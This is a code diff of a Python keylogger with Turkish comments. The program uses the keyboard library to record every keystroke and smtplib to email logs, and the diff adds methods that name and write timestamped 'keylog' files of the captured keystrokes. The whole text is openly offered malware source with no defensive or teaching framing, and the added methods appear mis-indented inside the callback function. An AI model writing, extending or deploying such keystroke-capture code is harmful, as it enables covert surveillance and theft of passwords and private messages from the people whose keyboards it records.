@@ -1,4 +1,3 @@
-# encoding:utf-8
 import keyboard # klavye kayitlarini kaydetmek icin
 import smtplib #smtp protokolu araciligiyla e-posta gonderme
 from threading import Timer
@@ -42,5 +41,18 @@ def callback(self, event):
             ad = f"[{ad.upper()}]"
     # son olarak, tus adini global `self.log` degiskenimize ekleyin
     self.log += ad
-    #burda türkçe karakterleri neden kullanmadığımı düşündüm ve programın ilk satırına utf encoding ekledim :D
+    def update_filename(self):
+        # baslangic ve bitis tarihlerine gore tanimlanacak dosya adini olusturun     
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        """Bu yontem, gecerli dizinde bir gunluk dosyasi olusturur. "self.log" degiskenindeki gecerli keyloglar"""
+        # dosyayi yazma modunda acin
+        with open(f"{self.filename}.txt", "w") as f:
+            # keylog'lari dosyaya yaz
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
     
